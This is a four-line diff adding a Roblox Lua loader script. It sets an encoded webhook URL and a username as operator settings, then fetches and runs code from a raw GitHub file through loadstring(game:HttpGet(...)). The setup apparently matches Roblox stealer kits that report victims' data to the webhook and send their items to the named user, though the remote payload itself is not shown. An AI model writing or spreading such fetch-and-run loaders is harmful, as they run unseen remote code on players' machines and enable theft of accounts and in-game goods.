@@ -1,0 +1,4 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=M0liemVJVlRMaktMSVVTZVU5ZnVzdzpfOFBQQndWT0Q4SmFjWmN2Q2x3WldpMWxod0RQLWJZaUxneldIempMZVRYRUZfWlBKX1JtaVNuQ09aX2NMWVlYMmlNdHZIU3RsTm9rZnJOUmtHa1g3UWxXb0ZXRUZMTTdoc2FadFhJeWlFcGQ2VkUxdXpnLUtKWm5BTzJpX1hmeXl6WU52Q19jeXhlQUh6cmY2ZzE0aEZNdkhCSWxXdVFLdmItODY3ZG8xRlU" -- << Ur webhook
+Username = "Rip_illusion444" -- << Ur username
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lelel22f/wow1/refs/heads/main/f222",true))()
